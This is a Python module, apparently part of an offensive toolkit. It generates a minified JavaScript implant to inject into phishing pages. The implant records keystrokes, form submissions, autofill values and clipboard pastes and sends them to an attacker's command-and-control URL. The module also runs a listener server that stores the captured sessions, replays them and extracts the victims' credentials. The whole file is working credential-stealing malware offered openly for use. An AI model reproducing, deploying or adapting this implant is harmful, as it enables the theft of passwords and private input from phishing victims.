"""
Session Capture Implant Generator (T2-3 — Microsoft Clarity ripped & weaponized).

Generates minimal JS implants that capture keystrokes, form fills,
clipboard, and DOM mutations from a phishing page — like Clarity but offensive.
Includes a Python listener server that receives and replays sessions.
"""
import os, json, time, base64, threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Callable, Optional
from shadowcypher.core.logger import logger


# ── JS Implant Template ───────────────────────────────────────────────────────

_IMPLANT_JS = """
(function() {
  var _c2 = '{c2_url}';
  var _sid = Math.random().toString(36).slice(2);
  var _buf = [];
  var _flush_interval = {flush_ms};

  function _send(events) {
    try {
      var xhr = new XMLHttpRequest();
      xhr.open('POST', _c2 + '/c', true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      xhr.send(JSON.stringify({s: _sid, e: events, t: Date.now()}));
    } catch(e) {}
  }

  function _ev(type, data) {
    _buf.push({tp: type, d: data, ts: Date.now()});
  }

  // Keystroke capture
  document.addEventListener('keydown', function(e) {
    _ev('key', {k: e.key, c: e.code, tg: (e.target||{}).tagName,
                nm: (e.target||{}).name, vl: (e.target||{}).value});
  }, true);

  // Form submit capture
  document.addEventListener('submit', function(e) {
    var f = e.target || {};
    var fields = {};
    try {
      var els = f.elements;
      for(var i=0; i<els.length; i++) {
        var el = els[i];
        if(el.name) fields[el.name] = el.value;
      }
    } catch(ex) {}
    _ev('form', {action: f.action, method: f.method, fields: fields});
  }, true);

  // Input change capture (catches autofill)
  document.addEventListener('change', function(e) {
    var t = e.target || {};
    if(t.name || t.id) {
      _ev('change', {nm: t.name, id: t.id, tp: t.type, vl: t.value});
    }
  }, true);

  // Paste / clipboard capture
  document.addEventListener('paste', function(e) {
    try {
      var d = (e.clipboardData||window.clipboardData).getData('text');
      _ev('paste', {d: d.slice(0, 500)});
    } catch(ex) {}
  }, true);

  // Visibility / focus tracking
  document.addEventListener('visibilitychange', function() {
    _ev('vis', {h: document.hidden});
  });
  window.addEventListener('focus', function() { _ev('focus', {}); });
  window.addEventListener('blur', function() { _ev('blur', {}); });

  // DOM mutation tracking (like Clarity)
  if(window.MutationObserver) {
    var mo = new MutationObserver(function(muts) {
      muts.forEach(function(m) {
        if(m.addedNodes.length) {
          _ev('dom', {type: m.type, target: (m.target||{}).tagName});
        }
      });
    });
    mo.observe(document.body || document.documentElement,
               {childList:true, subtree:true, attributes:false});
  }

  // Flush buffer on interval
  setInterval(function() {
    if(_buf.length > 0) {
      var to_send = _buf.splice(0, _buf.length);
      _send(to_send);
    }
  }, _flush_interval);

  // Also flush on page unload
  window.addEventListener('beforeunload', function() {
    if(_buf.length > 0) _send(_buf);
  });

})();
"""


class SessionCaptureListener:
    """Receives and stores session capture data from JS implants."""

    def __init__(self, host: str = "0.0.0.0", port: int = 7331):
        self._host = host
        self._port = port
        self._sessions: dict = {}   # session_id → list of event batches
        self._lock = threading.Lock()
        self._server: Optional[HTTPServer] = None
        self._on_event: Optional[Callable] = None

    def start(self, on_event: Callable = None) -> bool:
        """Start the capture listener server."""
        self._on_event = on_event
        handler = self._make_handler()
        try:
            self._server = HTTPServer((self._host, self._port), handler)
            t = threading.Thread(target=self._server.serve_forever,
                                 daemon=True, name="SessionCapture")
            t.start()
            logger.info("session_capture", f"Listener active on {self._host}:{self._port}")
            return True
        except Exception as e:
            logger.error("session_capture", f"Listener start failed: {e}")
            return False

    def stop(self):
        if self._server:
            self._server.shutdown()

    def get_sessions(self) -> dict:
        with self._lock:
            return dict(self._sessions)

    def replay_session(self, session_id: str, on_output: Callable = None):
        """Print a session replay showing what the victim typed and clicked."""
        with self._lock:
            batches = self._sessions.get(session_id, [])
        if not batches:
            if on_output: on_output(f"[CAPTURE] No session: {session_id}\n")
            return
        if on_output:
            on_output(f"\n[CAPTURE] SESSION REPLAY: {session_id}\n{'='*60}\n")
        for batch in batches:
            for ev in batch.get("e", []):
                tp = ev.get("tp")
                d = ev.get("d", {})
                ts = ev.get("ts", 0)
                if tp == "form":
                    if on_output:
                        on_output(f"[FORM SUBMIT] action={d.get('action')} fields={d.get('fields')}\n")
                elif tp == "key":
                    if on_output and d.get("vl"):
                        on_output(f"[KEYSTROKE] field={d.get('nm')} value={d.get('vl')}\n")
                elif tp == "paste":
                    if on_output:
                        on_output(f"[PASTE] content={d.get('d', '')[:200]}\n")
                elif tp == "change":
                    if on_output:
                        on_output(f"[FIELD CHANGE] name={d.get('nm')} type={d.get('tp')} value={d.get('vl')}\n")

    def extract_credentials(self) -> list[dict]:
        """Pull all form submissions and keystroke values from all sessions."""
        creds = []
        with self._lock:
            sessions = dict(self._sessions)
        for sid, batches in sessions.items():
            for batch in batches:
                for ev in batch.get("e", []):
                    if ev.get("tp") == "form":
                        creds.append({"session": sid, "type": "form_submit",
                                      "data": ev.get("d", {})})
                    elif ev.get("tp") == "change" and ev.get("d", {}).get("vl"):
                        creds.append({"session": sid, "type": "field_value",
                                      "data": ev.get("d", {})})
        return creds

    def _make_handler(self):
        listener = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, fmt, *args): pass  # Suppress access logs

            def do_POST(self):
                if self.path != "/c":
                    self.send_response(404); self.end_headers(); return
                try:
                    length = int(self.headers.get("Content-Length", 0))
                    body = self.rfile.read(length)
                    data = json.loads(body)
                    sid = data.get("s", "unknown")
                    with listener._lock:
                        if sid not in listener._sessions:
                            listener._sessions[sid] = []
                            logger.info("session_capture", f"NEW_SESSION: {sid}")
                        listener._sessions[sid].append(data)
                    if listener._on_event:
                        try: listener._on_event(sid, data)
                        except Exception: pass
                    self.send_response(204)
                    self.send_header("Access-Control-Allow-Origin", "*")
                    self.end_headers()
                except Exception:
                    self.send_response(400); self.end_headers()

            def do_OPTIONS(self):
                self.send_response(204)
                self.send_header("Access-Control-Allow-Origin", "*")
                self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
                self.send_header("Access-Control-Allow-Headers", "Content-Type")
                self.end_headers()

        return Handler


class SessionCaptureImplant:
    """Generates JS implants and manages the capture listener."""

    def __init__(self):
        self.listener = SessionCaptureListener()

    def generate_implant(self, c2_url: str, flush_ms: int = 3000) -> str:
        """
        Generate the JS implant script.

        Args:
            c2_url:   URL of the capture listener (e.g. "http://your-server:7331")
            flush_ms: How often to flush events to C2 (milliseconds)

        Returns:
            Minified JS string — inject into target page via <script> tag.
        """
        js = _IMPLANT_JS.replace("{c2_url}", c2_url).replace("{flush_ms}", str(flush_ms))
        # Basic minification: remove comments and extra whitespace
        import re
        js = re.sub(r"//[^\n]*", "", js)
        js = re.sub(r"\s{2,}", " ", js)
        return js.strip()

    def generate_script_tag(self, c2_url: str, flush_ms: int = 3000,
                            async_load: bool = True) -> str:
        """Return a <script> tag ready to inject into a phishing page."""
        js = self.generate_implant(c2_url, flush_ms)
        tag = f'<script{"async" if async_load else ""}>{js}</script>'
        return tag

    def save_implant(self, output_path: str, c2_url: str, flush_ms: int = 3000) -> str:
        """Save implant JS to a file."""
        js = self.generate_implant(c2_url, flush_ms)
        with open(output_path, "w") as f:
            f.write(js)
        logger.info("session_capture", f"Implant saved: {output_path} ({len(js)}B)")
        return output_path


session_capture = SessionCaptureImplant()
